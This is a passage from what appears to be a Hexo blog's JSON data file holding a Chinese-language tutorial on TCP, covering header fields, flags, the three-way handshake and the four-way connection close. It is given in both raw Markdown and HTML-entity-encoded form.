louddn.com/TCP%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E4%B8%8E%E5%9B%9B%E6%AC%A1%E5%88%86%E6%89%8B/8.jpg)\n\n---\n\n## 相关疑问\n**【问题1】为什么连接的时候是三次握手，关闭的时候却是四次握手？**\n答：因为当Server端收到Client端的SYN连接请求报文后，可以直接发送SYN+ACK报文。其中ACK报文是用来应答的，SYN报文是用来同步的。但是关闭连接时，当Server端收到FIN报文时，很可能并不会立即关闭SOCKET，所以只能先回复一个ACK报文，告诉Client端，\"你发的FIN报文我收到了\"。只有等到我Server端所有的报文都发送完了，我才能发送FIN报文，因此不能一起发送。故需要四步握手。\n\n**【问题2】为什么TIME_WAIT状态需要经过2MSL(最大报文段生存时间)才能返回到CLOSE状态？**\n答：虽然按道理，四个报文都发送完毕，我们可以直接进入CLOSE状态了，但是我们必须假象网络是不可靠的，有可以最后一个ACK丢失。所以TIME_WAIT状态就是用来重发可能丢失的ACK报文。\n\n**【问题3】为什么不能用两次握手进行连接？**\n我们知道，3次握手完成两个重要的功能，既要双方做好发送数据的准备工作(双方都知道彼此已准备好)，也要允许双方就初始序列号进行协商，这个序列号在握手过程中被发送和确认。\n现在把三次握手改成仅需要两次握手，死锁是可能发生的。作为例子，考虑计算机S和C之间的通信，假定C给S发送一个连接请求分组，S收到了这个分组，并发送了确认应答分组。按照两次握手的协定，S认为连接已经成功地建立了，可以开始发送数据分组。可是，C在S的应答分组在传输中被丢失的情况下，将不知道S是否已准备好，不知道S建立什么样的序列号，C甚至怀疑S是否收到自己的连接请求分组。在这种情况下，C认为连接还未建立成功，将忽略S发来的任何数据分 组，只等待连接确认应答分组。而S在发出的分组超时后，重复发送同样的分组。这样就形成了死锁。","slug":"TCP三次握手与四次分手","published":1,"updated":"2016-11-17T11:59:42.670Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciwbrulcd002egwtmivimugdl","content":"<h2 id=\"TCP&#x7B80;&#x4ECB;\"><a href=\"#TCP&#x7B80;&#x4ECB;\" class=\"headerlink\" title=\"TCP&#x7B80;&#x4ECB;\"></a>TCP&#x7B80;&#x4ECB;</h2><p>&#x9996;&#x5148;&#x6765;&#x770B;&#x770B;OSI&#x7684;&#x4E03;&#x5C42;&#x6A21;&#x578B;&#xFF1A;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/TCP%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E4%B8%8E%E5%9B%9B%E6%AC%A1%E5%88%86%E6%89%8B/1.jpg\" alt=\"\"></p>\n<p>&#x6211;&#x4EEC;&#x9700;&#x8981;&#x77E5;&#x9053;TCP&#x5DE5;&#x4F5C;&#x5728;&#x7F51;&#x7EDC;OSI&#x7684;&#x4E03;&#x5C42;&#x6A21;&#x578B;&#x4E2D;&#x7684;&#x7B2C;&#x56DB;&#x5C42;&#x2014;&#x2014;Transport&#x5C42;&#xFF0C;IP&#x5728;&#x7B2C;&#x4E09;&#x5C42;&#x2014;&#x2014;Network&#x5C42;&#xFF0C;ARP&#x5728;&#x7B2C;&#x4E8C;&#x5C42;&#x2014;&#x2014;Data Link&#x5C42;&#xFF1B;&#x5728;&#x7B2C;&#x4E8C;&#x5C42;&#x4E0A;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x6211;&#x4EEC;&#x628A;&#x5B83;&#x53EB;Frame&#xFF0C;&#x5728;&#x7B2C;&#x4E09;&#x5C42;&#x4E0A;&#x7684;&#x6570;&#x636E;&#x53EB;Packet&#xFF0C;&#x7B2C;&#x56DB;&#x5C42;&#x7684;&#x6570;&#x636E;&#x53EB;Segment&#x3002; &#x540C;&#x65F6;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x7B80;&#x5355;&#x7684;&#x77E5;&#x9053;&#xFF0C;&#x6570;&#x636E;&#x4ECE;&#x5E94;&#x7528;&#x5C42;&#x53D1;&#x4E0B;&#x6765;&#xFF0C;&#x4F1A;&#x5728;&#x6BCF;&#x4E00;&#x5C42;&#x90FD;&#x4F1A;&#x52A0;&#x4E0A;&#x5934;&#x90E8;&#x4FE1;&#x606F;&#xFF0C;&#x8FDB;&#x884C;&#x5C01;&#x88C5;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x53D1;&#x9001;&#x5230;&#x6570;&#x636E;&#x63A5;&#x6536;&#x7AEF;&#x3002;&#x8FD9;&#x4E2A;&#x57FA;&#x672C;&#x7684;&#x6D41;&#x7A0B;&#x4F60;&#x9700;&#x8981;&#x77E5;&#x9053;&#xFF0C;&#x5C31;&#x662F;&#x6BCF;&#x4E2A;&#x6570;&#x636E;&#x90FD;&#x4F1A;&#x7ECF;&#x8FC7;&#x6570;&#x636E;&#x7684;&#x5C01;&#x88C5;&#x548C;&#x89E3;&#x5C01;&#x88C5;&#x7684;&#x8FC7;&#x7A0B;&#x3002; &#x5728;OSI&#x4E03;&#x5C42;&#x6A21;&#x578B;&#x4E2D;&#xFF0C;&#x6BCF;&#x4E00;&#x5C42;&#x7684;&#x4F5C;&#x7528;&#x548C;&#x5BF9;&#x5E94;&#x7684;&#x534F;&#x8BAE;&#x5982;&#x4E0B;&#xFF1A; </p>\n<a id=\"more\"></a>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/TCP%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E4%B8%8E%E5%9B%9B%E6%AC%A1%E5%88%86%E6%89%8B/2.jpg\" alt=\"\"></p>\n<p>TCP&#x662F;&#x4E00;&#x4E2A;&#x534F;&#x8BAE;&#xFF0C;&#x90A3;&#x8FD9;&#x4E2A;&#x534F;&#x8BAE;&#x662F;&#x5982;&#x4F55;&#x5B9A;&#x4E49;&#x7684;&#xFF0C;&#x5B83;&#x7684;&#x6570;&#x636E;&#x683C;&#x5F0F;&#x662F;&#x4EC0;&#x4E48;&#x6837;&#x5B50;&#x7684;&#x5462;&#xFF1F;&#x8981;&#x8FDB;&#x884C;&#x66F4;&#x6DF1;&#x5C42;&#x6B21;&#x7684;&#x5256;&#x6790;&#xFF0C;&#x5C31;&#x9700;&#x8981;&#x4E86;&#x89E3;&#xFF0C;&#x751A;&#x81F3;&#x662F;&#x719F;&#x8BB0;TCP&#x534F;&#x8BAE;&#x4E2D;&#x6BCF;&#x4E2A;&#x5B57;&#x6BB5;&#x7684;&#x542B;&#x4E49;&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/TCP%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E4%B8%8E%E5%9B%9B%E6%AC%A1%E5%88%86%E6%89%8B/3.jpg\" alt=\"\"></p>\n<p>&#x4E0A;&#x9762;&#x5C31;&#x662F;TCP&#x534F;&#x8BAE;&#x5934;&#x90E8;&#x7684;&#x683C;&#x5F0F;&#xFF0C;&#x7531;&#x4E8E;&#x5B83;&#x592A;&#x91CD;&#x8981;&#x4E86;&#xFF0C;&#x662F;&#x7406;&#x89E3;&#x5176;&#x5B83;&#x5185;&#x5BB9;&#x7684;&#x57FA;&#x7840;&#xFF0C;&#x4E0B;&#x9762;&#x5C31;&#x5C06;&#x6BCF;&#x4E2A;&#x5B57;&#x6BB5;&#x7684;&#x4FE1;&#x606F;&#x90FD;&#x8BE6;&#x7EC6;&#x7684;&#x8BF4;&#x660E;&#x4E00;&#x4E0B;&#x3002;</p>\n<ul>\n<li>Source Port&#x548C;Destination Port:&#x5206;&#x522B;&#x5360;&#x7528;16&#x4F4D;&#xFF0C;&#x8868;&#x793A;&#x6E90;&#x7AEF;&#x53E3;&#x53F7;&#x548C;&#x76EE;&#x7684;&#x7AEF;&#x53E3;&#x53F7;&#xFF1B;&#x7528;&#x4E8E;&#x533A;&#x522B;&#x4E3B;&#x673A;&#x4E2D;&#x7684;&#x4E0D;&#x540C;&#x8FDB;&#x7A0B;&#xFF0C;&#x800C;IP&#x5730;&#x5740;&#x662F;&#x7528;&#x6765;&#x533A;&#x5206;&#x4E0D;&#x540C;&#x7684;&#x4E3B;&#x673A;&#x7684;&#xFF0C;&#x6E90;&#x7AEF;&#x53E3;&#x53F7;&#x548C;&#x76EE;&#x7684;&#x7AEF;&#x53E3;&#x53F7;&#x914D;&#x5408;&#x4E0A;IP&#x9996;&#x90E8;&#x4E2D;&#x7684;&#x6E90;IP&#x5730;&#x5740;&#x548C;&#x76EE;&#x7684;IP&#x5730;&#x5740;&#x5C31;&#x80FD;&#x552F;&#x4E00;&#x7684;&#x786E;&#x5B9A;&#x4E00;&#x4E2A;TCP&#x8FDE;&#x63A5;&#xFF1B;</li>\n<li>Sequence Number:&#x7528;&#x6765;&#x6807;&#x8BC6;&#x4ECE;TCP&#x53D1;&#x7AEF;&#x5411;TCP&#x6536;&#x7AEF;&#x53D1;&#x9001;&#x7684;&#x6570;&#x636E;&#x5B57;&#x8282;&#x6D41;&#xFF0C;&#x5B83;&#x8868;&#x793A;&#x5728;&#x8FD9;&#x4E2A;&#x62A5;&#x6587;&#x6BB5;&#x4E2D;&#x7684;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x5B57;&#x8282;&#x5728;&#x6570;&#x636E;&#x6D41;&#x4E2D;&#x7684;&#x5E8F;&#x53F7;&#xFF1B;&#x4E3B;&#x8981;&#x7528;&#x6765;&#x89E3;&#x51B3;&#x7F51;&#x7EDC;&#x62A5;&#x4E71;&#x5E8F;&#x7684;&#x95EE;&#x9898;&#xFF1B;</li>\n<li>Acknowledgment Number:32&#x4F4D;&#x786E;&#x8BA4;&#x5E8F;&#x5217;&#x53F7;&#x5305;&#x542B;&#x53D1;&#x9001;&#x786E;&#x8BA4;&#x7684;&#x4E00;&#x7AEF;&#x6240;&#x671F;&#x671B;&#x6536;&#x5230;&#x7684;&#x4E0B;&#x4E00;&#x4E2A;&#x5E8F;&#x53F7;&#xFF0C;&#x56E0;&#x6B64;&#xFF0C;&#x786E;&#x8BA4;&#x5E8F;&#x53F7;&#x5E94;&#x5F53;&#x662F;&#x4E0A;&#x6B21;&#x5DF2;&#x6210;&#x529F;&#x6536;&#x5230;&#x6570;&#x636E;&#x5B57;&#x8282;&#x5E8F;&#x53F7;&#x52A0;1&#x3002;&#x4E0D;&#x8FC7;&#xFF0C;&#x53EA;&#x6709;&#x5F53;&#x6807;&#x5FD7;&#x4F4D;&#x4E2D;&#x7684;ACK&#x6807;&#x5FD7;&#xFF08;&#x4E0B;&#x9762;&#x4ECB;&#x7ECD;&#xFF09;&#x4E3A;1&#x65F6;&#x8BE5;&#x786E;&#x8BA4;&#x5E8F;&#x5217;&#x53F7;&#x7684;&#x5B57;&#x6BB5;&#x624D;&#x6709;&#x6548;&#x3002;&#x4E3B;&#x8981;&#x7528;&#x6765;&#x89E3;&#x51B3;&#x4E0D;&#x4E22;&#x5305;&#x7684;&#x95EE;&#x9898;&#xFF1B;</li>\n<li>Offset:&#x7ED9;&#x51FA;&#x9996;&#x90E8;&#x4E2D;32 bit&#x5B57;&#x7684;&#x6570;&#x76EE;&#xFF0C;&#x9700;&#x8981;&#x8FD9;&#x4E2A;&#x503C;&#x662F;&#x56E0;&#x4E3A;&#x4EFB;&#x9009;&#x5B57;&#x6BB5;&#x7684;&#x957F;&#x5EA6;&#x662F;&#x53EF;&#x53D8;&#x7684;&#x3002;&#x8FD9;&#x4E2A;&#x5B57;&#x6BB5;&#x5360;4bit&#xFF08;&#x6700;&#x591A;&#x80FD;&#x8868;&#x793A;15&#x4E2A;32bit&#x7684;&#x7684;&#x5B57;&#xFF0C;&#x5373;4*15=60&#x4E2A;&#x5B57;&#x8282;&#x7684;&#x9996;&#x90E8;&#x957F;&#x5EA6;&#xFF09;&#xFF0C;&#x56E0;&#x6B64;TCP&#x6700;&#x591A;&#x6709;60&#x5B57;&#x8282;&#x7684;&#x9996;&#x90E8;&#x3002;&#x7136;&#x800C;&#xFF0C;&#x6CA1;&#x6709;&#x4EFB;&#x9009;&#x5B57;&#x6BB5;&#xFF0C;&#x6B63;&#x5E38;&#x7684;&#x957F;&#x5EA6;&#x662F;20&#x5B57;&#x8282;&#xFF1B;</li>\n<li>TCP Flags:TCP&#x9996;&#x90E8;&#x4E2D;&#x6709;6&#x4E2A;&#x6807;&#x5FD7;&#x6BD4;&#x7279;&#xFF0C;&#x5B83;&#x4EEC;&#x4E2D;&#x7684;&#x591A;&#x4E2A;&#x53EF;&#x540C;&#x65F6;&#x88AB;&#x8BBE;&#x7F6E;&#x4E3A;1&#xFF0C;&#x4E3B;&#x8981;&#x662F;&#x7528;&#x4E8E;&#x64CD;&#x63A7;TCP&#x7684;&#x72B6;&#x6001;&#x673A;&#x7684;&#xFF0C;&#x4F9D;&#x6B21;&#x4E3A;URG&#xFF0C;ACK&#xFF0C;PSH&#xFF0C;RST&#xFF0C;SYN&#xFF0C;FIN&#x3002;&#x6BCF;&#x4E2A;&#x6807;&#x5FD7;&#x4F4D;&#x7684;&#x610F;&#x601D;&#x5982;&#x4E0B;&#xFF1A;<ul>\n<li>URG&#xFF1A;&#x6B64;&#x6807;&#x5FD7;&#x8868;&#x793A;TCP&#x5305;&#x7684;&#x7D27;&#x6025;&#x6307;&#x9488;&#x57DF;&#xFF08;&#x540E;&#x9762;&#x9A6C;&#x4E0A;&#x5C31;&#x8981;&#x8BF4;&#x5230;&#xFF09;&#x6709;&#x6548;&#xFF0C;&#x7528;&#x6765;&#x4FDD;&#x8BC1;TCP&#x8FDE;&#x63A5;&#x4E0D;&#x88AB;&#x4E2D;&#x65AD;&#xFF0C;&#x5E76;&#x4E14;&#x7763;&#x4FC3;&#x4E2D;&#x95F4;&#x5C42;&#x8BBE;&#x5907;&#x8981;&#x5C3D;&#x5FEB;&#x5904;&#x7406;&#x8FD9;&#x4E9B;&#x6570;&#x636E;&#xFF1B;</li>\n<li>ACK&#xFF1A;&#x6B64;&#x6807;&#x5FD7;&#x8868;&#x793A;&#x5E94;&#x7B54;&#x57DF;&#x6709;&#x6548;&#xFF0C;&#x5C31;&#x662F;&#x8BF4;&#x524D;&#x9762;&#x6240;&#x8BF4;&#x7684;TCP&#x5E94;&#x7B54;&#x53F7;&#x5C06;&#x4F1A;&#x5305;&#x542B;&#x5728;TCP&#x6570;&#x636E;&#x5305;&#x4E2D;&#xFF1B;&#x6709;&#x4E24;&#x4E2A;&#x53D6;&#x503C;&#xFF1A;0&#x548C;1&#xFF0C;&#x4E3A;1&#x7684;&#x65F6;&#x5019;&#x8868;&#x793A;&#x5E94;&#x7B54;&#x57DF;&#x6709;&#x6548;&#xFF0C;&#x53CD;&#x4E4B;&#x4E3A;0&#xFF1B;</li>\n<li>PSH&#xFF1A;&#x8FD9;&#x4E2A;&#x6807;&#x5FD7;&#x4F4D;&#x8868;&#x793A;Push&#x64CD;&#x4F5C;&#x3002;&#x6240;&#x8C13;Push&#x64CD;&#x4F5C;&#x5C31;&#x662F;&#x6307;&#x5728;&#x6570;&#x636E;&#x5305;&#x5230;&#x8FBE;&#x63A5;&#x6536;&#x7AEF;&#x4EE5;&#x540E;&#xFF0C;&#x7ACB;&#x5373;&#x4F20;&#x9001;&#x7ED9;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x5728;&#x7F13;&#x51B2;&#x533A;&#x4E2D;&#x6392;&#x961F;&#xFF1B;</li>\n<li>RST&#xFF1A;&#x8FD9;&#x4E2A;&#x6807;&#x5FD7;&#x8868;&#x793A;&#x8FDE;&#x63A5;&#x590D;&#x4F4D;&#x8BF7;&#x6C42;&#x3002;&#x7528;&#x6765;&#x590D;&#x4F4D;&#x90A3;&#x4E9B;&#x4EA7;&#x751F;&#x9519;&#x8BEF;&#x7684;&#x8FDE;&#x63A5;&#xFF0C;&#x4E5F;&#x88AB;&#x7528;&#x6765;&#x62D2;&#x7EDD;&#x9519;&#x8BEF;&#x548C;&#x975E;&#x6CD5;&#x7684;&#x6570;&#x636E;&#x5305;&#xFF1B;</li>\n<li>SYN&#xFF1A;&#x8868;&#x793A;&#x540C;&#x6B65;&#x5E8F;&#x53F7;&#xFF0C;&#x7528;&#x6765;&#x5EFA;&#x7ACB;&#x8FDE;&#x63A5;&#x3002;SYN&#x6807;&#x5FD7;&#x4F4D;&#x548C;ACK&#x6807;&#x5FD7;&#x4F4D;&#x642D;&#x914D;&#x4F7F;&#x7528;&#xFF0C;&#x5F53;&#x8FDE;&#x63A5;&#x8BF7;&#x6C42;&#x7684;&#x65F6;&#x5019;&#xFF0C;SYN=1&#xFF0C;ACK=0&#xFF1B;&#x8FDE;&#x63A5;&#x88AB;&#x54CD;&#x5E94;&#x7684;&#x65F6;&#x5019;&#xFF0C;SYN=1&#xFF0C;ACK=1&#xFF1B;&#x8FD9;&#x4E2A;&#x6807;&#x5FD7;&#x7684;&#x6570;&#x636E;&#x5305;&#x7ECF;&#x5E38;&#x88AB;&#x7528;&#x6765;&#x8FDB;&#x884C;&#x7AEF;&#x53E3;&#x626B;&#x63CF;&#x3002;&#x626B;&#x63CF;&#x8005;&#x53D1;&#x9001;&#x4E00;&#x4E2A;&#x53EA;&#x6709;SYN&#x7684;&#x6570;&#x636E;&#x5305;&#xFF0C;&#x5982;&#x679C;&#x5BF9;&#x65B9;&#x4E3B;&#x673A;&#x54CD;&#x5E94;&#x4E86;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x5305;&#x56DE;&#x6765; &#xFF0C;&#x5C31;&#x8868;&#x660E;&#x8FD9;&#x53F0;&#x4E3B;&#x673A;&#x5B58;&#x5728;&#x8FD9;&#x4E2A;&#x7AEF;&#x53E3;&#xFF1B;&#x4F46;&#x662F;&#x7531;&#x4E8E;&#x8FD9;&#x79CD;&#x626B;&#x63CF;&#x65B9;&#x5F0F;&#x53EA;&#x662F;&#x8FDB;&#x884C;TCP&#x4E09;&#x6B21;&#x63E1;&#x624B;&#x7684;&#x7B2C;&#x4E00;&#x6B21;&#x63E1;&#x624B;&#xFF0C;&#x56E0;&#x6B64;&#x8FD9;&#x79CD;&#x626B;&#x63CF;&#x7684;&#x6210;&#x529F;&#x8868;&#x793A;&#x88AB;&#x626B;&#x63CF;&#x7684;&#x673A;&#x5668;&#x4E0D;&#x5F88;&#x5B89;&#x5168;&#xFF0C;&#x4E00;&#x53F0;&#x5B89;&#x5168;&#x7684;&#x4E3B;&#x673A;&#x5C06;&#x4F1A;&#x5F3A;&#x5236;&#x8981;&#x6C42;&#x4E00;&#x4E2A;&#x8FDE;&#x63A5;&#x4E25;&#x683C;&#x7684;&#x8FDB;&#x884C;TCP&#x7684;&#x4E09;&#x6B21;&#x63E1;&#x624B;&#xFF1B;</li>\n<li>FIN&#xFF1A; &#x8868;&#x793A;&#x53D1;&#x9001;&#x7AEF;&#x5DF2;&#x7ECF;&#x8FBE;&#x5230;&#x6570;&#x636E;&#x672B;&#x5C3E;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x53CC;&#x65B9;&#x7684;&#x6570;&#x636E;&#x4F20;&#x9001;&#x5B8C;&#x6210;&#xFF0C;&#x6CA1;&#x6709;&#x6570;&#x636E;&#x53EF;&#x4EE5;&#x4F20;&#x9001;&#x4E86;&#xFF0C;&#x53D1;&#x9001;FIN&#x6807;&#x5FD7;&#x4F4D;&#x7684;TCP&#x6570;&#x636E;&#x5305;&#x540E;&#xFF0C;&#x8FDE;&#x63A5;&#x5C06;&#x88AB;&#x65AD;&#x5F00;&#x3002;&#x8FD9;&#x4E2A;&#x6807;&#x5FD7;&#x7684;&#x6570;&#x636E;&#x5305;&#x4E5F;&#x7ECF;&#x5E38;&#x88AB;&#x7528;&#x4E8E;&#x8FDB;&#x884C;&#x7AEF;&#x53E3;&#x626B;&#x63CF;&#x3002;</li>\n</ul>\n</li>\n<li>Window:&#x7A97;&#x53E3;&#x5927;&#x5C0F;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x6709;&#x540D;&#x7684;&#x6ED1;&#x52A8;&#x7A97;&#x53E3;&#xFF0C;&#x7528;&#x6765;&#x8FDB;&#x884C;&#x6D41;&#x91CF;&#x63A7;&#x5236;&#xFF1B;&#x8FD9;&#x662F;&#x4E00;&#x4E2A;&#x590D;&#x6742;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x8FD9;&#x7BC7;&#x535A;&#x6587;&#x4E2D;&#x5E76;&#x4E0D;&#x4F1A;&#x8FDB;&#x884C;&#x603B;&#x7ED3;&#x7684;&#xFF1B;</li>\n</ul>\n<hr>\n<h2 id=\"TCP&#x4E09;&#x6B21;&#x63E1;&#x624B;\"><a href=\"#TCP&#x4E09;&#x6B21;&#x63E1;&#x624B;\" class=\"headerlink\" title=\"TCP&#x4E09;&#x6B21;&#x63E1;&#x624B;\"></a>TCP&#x4E09;&#x6B21;&#x63E1;&#x624B;</h2><p>&#x5EFA;&#x7ACB;TCP&#x9700;&#x8981;&#x4E09;&#x6B21;&#x63E1;&#x624B;&#x624D;&#x80FD;&#x5EFA;&#x7ACB;&#xFF0C;&#x800C;&#x65AD;&#x5F00;&#x8FDE;&#x63A5;&#x5219;&#x9700;&#x8981;&#x56DB;&#x6B21;&#x63E1;&#x624B;&#x3002;&#x6574;&#x4E2A;&#x8FC7;&#x7A0B;&#x5982;&#x4E0B;&#x56FE;&#x6240;&#x793A;&#xFF1A;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/TCP%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E4%B8%8E%E5%9B%9B%E6%AC%A1%E5%88%86%E6%89%8B/4.jpg\" alt=\"\"></p>\n<p>&#x5148;&#x6765;&#x770B;&#x770B;&#x5982;&#x4F55;&#x5EFA;&#x7ACB;&#x8FDE;&#x63A5;&#x7684;&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/TCP%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E4%B8%8E%E5%9B%9B%E6%AC%A1%E5%88%86%E6%89%8B/5.jpg\" alt=\"\"></p>\n<ul>\n<li>&#x7B2C;&#x4E00;&#x6B21;&#x63E1;&#x624B;&#xFF1A;&#x5EFA;&#x7ACB;&#x8FDE;&#x63A5;&#x3002;&#x5BA2;&#x6237;&#x7AEF;&#x53D1;&#x9001;&#x8FDE;&#x63A5;&#x8BF7;&#x6C42;&#x62A5;&#x6587;&#x6BB5;&#xFF0C;&#x5C06;SYN&#x4F4D;&#x7F6E;&#x4E3A;1&#xFF0C;Sequence Number&#x4E3A;x&#xFF1B;&#x7136;&#x540E;&#xFF0C;&#x5BA2;&#x6237;&#x7AEF;&#x8FDB;&#x5165;SYN_SEND&#x72B6;&#x6001;&#xFF0C;&#x7B49;&#x5F85;&#x670D;&#x52A1;&#x5668;&#x7684;&#x786E;&#x8BA4;&#xFF1B;</li>\n<li>&#x7B2C;&#x4E8C;&#x6B21;&#x63E1;&#x624B;&#xFF1A;&#x670D;&#x52A1;&#x5668;&#x6536;&#x5230;SYN&#x62A5;&#x6587;&#x6BB5;&#x3002;&#x670D;&#x52A1;&#x5668;&#x6536;&#x5230;&#x5BA2;&#x6237;&#x7AEF;&#x7684;SYN&#x62A5;&#x6587;&#x6BB5;&#xFF0C;&#x9700;&#x8981;&#x5BF9;&#x8FD9;&#x4E2A;SYN&#x62A5;&#x6587;&#x6BB5;&#x8FDB;&#x884C;&#x786E;&#x8BA4;&#xFF0C;&#x8BBE;&#x7F6E;Acknowledgment Number&#x4E3A;x+1(Sequence Number+1)&#xFF1B;&#x540C;&#x65F6;&#xFF0C;&#x81EA;&#x5DF1;&#x81EA;&#x5DF1;&#x8FD8;&#x8981;&#x53D1;&#x9001;SYN&#x8BF7;&#x6C42;&#x4FE1;&#x606F;&#xFF0C;&#x5C06;SYN&#x4F4D;&#x7F6E;&#x4E3A;1&#xFF0C;Sequence Number&#x4E3A;y&#xFF1B;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x5C06;&#x4E0A;&#x8FF0;&#x6240;&#x6709;&#x4FE1;&#x606F;&#x653E;&#x5230;&#x4E00;&#x4E2A;&#x62A5;&#x6587;&#x6BB5;&#xFF08;&#x5373;SYN+ACK&#x62A5;&#x6587;&#x6BB5;&#xFF09;&#x4E2D;&#xFF0C;&#x4E00;&#x5E76;&#x53D1;&#x9001;&#x7ED9;&#x5BA2;&#x6237;&#x7AEF;&#xFF0C;&#x6B64;&#x65F6;&#x670D;&#x52A1;&#x5668;&#x8FDB;&#x5165;SYN_RECV&#x72B6;&#x6001;&#xFF1B;</li>\n<li>&#x7B2C;&#x4E09;&#x6B21;&#x63E1;&#x624B;&#xFF1A;&#x5BA2;&#x6237;&#x7AEF;&#x6536;&#x5230;&#x670D;&#x52A1;&#x5668;&#x7684;SYN+ACK&#x62A5;&#x6587;&#x6BB5;&#x3002;&#x7136;&#x540E;&#x5C06;Acknowledgment Number&#x8BBE;&#x7F6E;&#x4E3A;y+1&#xFF0C;&#x5411;&#x670D;&#x52A1;&#x5668;&#x53D1;&#x9001;ACK&#x62A5;&#x6587;&#x6BB5;&#xFF0C;&#x8FD9;&#x4E2A;&#x62A5;&#x6587;&#x6BB5;&#x53D1;&#x9001;&#x5B8C;&#x6BD5;&#x4EE5;&#x540E;&#xFF0C;&#x5BA2;&#x6237;&#x7AEF;&#x548C;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x90FD;&#x8FDB;&#x5165;ESTABLISHED&#x72B6;&#x6001;&#xFF0C;&#x5B8C;&#x6210;TCP&#x4E09;&#x6B21;&#x63E1;&#x624B;&#x3002;</li>\n</ul>\n<p><strong>&#x5176;&#x5B9E;&#x4E09;&#x6B21;&#x63E1;&#x624B;&#x5C31;&#x662F;&#xFF0C;A&#x544A;&#x8BC9;B&#x8981;&#x8FDE;&#x63A5;&#xFF0C;B&#x901A;&#x77E5;A&#x53EF;&#x4EE5;&#x8FDE;&#x63A5;&#x4E86;&#xFF0C;A&#x518D;&#x544A;&#x8BC9;B&#xFF0C;&#x90A3;&#x6211;&#x8FDE;&#x63A5;&#x4E86;&#x3002;</strong></p>\n<hr>\n<h2 id=\"TCP&#x56DB;&#x6B21;&#x6325;&#x624B;\"><a href=\"#TCP&#x56DB;&#x6B21;&#x6325;&#x624B;\" class=\"headerlink\" title=\"TCP&#x56DB;&#x6B21;&#x6325;&#x624B;\"></a>TCP&#x56DB;&#x6B21;&#x6325;&#x624B;</h2><p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/TCP%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E4%B8%8E%E5%9B%9B%E6%AC%A1%E5%88%86%E6%89%8B/6.jpg\" alt=\"\"><br>&#x5047;&#x8BBE;Client&#x7AEF;&#x53D1;&#x8D77;&#x4E2D;&#x65AD;&#x8FDE;&#x63A5;&#x8BF7;&#x6C42;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x53D1;&#x9001;FIN&#x62A5;&#x6587;&#x3002;Server&#x7AEF;&#x63A5;&#x5230;FIN&#x62A5;&#x6587;&#x540E;&#xFF0C;&#x610F;&#x601D;&#x662F;&#x8BF4;&#x201D;<strong>&#x6211;Client&#x7AEF;&#x6CA1;&#x6709;&#x6570;&#x636E;&#x8981;&#x53D1;&#x7ED9;&#x4F60;&#x4E86;</strong>&#x201C;&#xFF0C;&#x4F46;&#x662F;&#x5982;&#x679C;&#x4F60;&#x8FD8;&#x6709;&#x6570;&#x636E;&#x6CA1;&#x6709;&#x53D1;&#x9001;&#x5B8C;&#x6210;&#xFF0C;&#x5219;&#x4E0D;&#x5FC5;&#x6025;&#x7740;&#x5173;&#x95ED;Socket&#xFF0C;&#x53EF;&#x4EE5;&#x7EE7;&#x7EED;&#x53D1;&#x9001;&#x6570;&#x636E;&#x3002;&#x6240;&#x4EE5;&#x4F60;&#x5148;&#x53D1;&#x9001;ACK&#xFF0C;&#x201D;<strong>&#x544A;&#x8BC9;Client&#x7AEF;&#xFF0C;&#x4F60;&#x7684;&#x8BF7;&#x6C42;&#x6211;&#x6536;&#x5230;&#x4E86;&#xFF0C;&#x4F46;&#x662F;&#x6211;&#x8FD8;&#x6CA1;&#x51C6;&#x5907;&#x597D;&#xFF0C;&#x8BF7;&#x7EE7;&#x7EED;&#x4F60;&#x7B49;&#x6211;&#x7684;&#x6D88;&#x606F;</strong>&#x201C;&#x3002;&#x8FD9;&#x4E2A;&#x65F6;&#x5019;Client&#x7AEF;&#x5C31;&#x8FDB;&#x5165;FIN_WAIT&#x72B6;&#x6001;&#xFF0C;&#x7EE7;&#x7EED;&#x7B49;&#x5F85;Server&#x7AEF;&#x7684;FIN&#x62A5;&#x6587;&#x3002;&#x5F53;Server&#x7AEF;&#x786E;&#x5B9A;&#x6570;&#x636E;&#x5DF2;&#x53D1;&#x9001;&#x5B8C;&#x6210;&#xFF0C;&#x5219;&#x5411;Client&#x7AEF;&#x53D1;&#x9001;FIN&#x62A5;&#x6587;&#xFF0C;&#x201D;<strong>&#x544A;&#x8BC9;Client&#x7AEF;&#xFF0C;&#x597D;&#x4E86;&#xFF0C;&#x6211;&#x8FD9;&#x8FB9;&#x6570;&#x636E;&#x53D1;&#x5B8C;&#x4E86;&#xFF0C;&#x51C6;&#x5907;&#x597D;&#x5173;&#x95ED;&#x8FDE;&#x63A5;&#x4E86;</strong>&#x201C;&#x3002;Client&#x7AEF;&#x6536;&#x5230;FIN&#x62A5;&#x6587;&#x540E;&#xFF0C;&#x201D;<strong>&#x5C31;&#x77E5;&#x9053;&#x53EF;&#x4EE5;&#x5173;&#x95ED;&#x8FDE;&#x63A5;&#x4E86;&#xFF0C;&#x4F46;&#x662F;&#x4ED6;&#x8FD8;&#x662F;&#x4E0D;&#x76F8;&#x4FE1;&#x7F51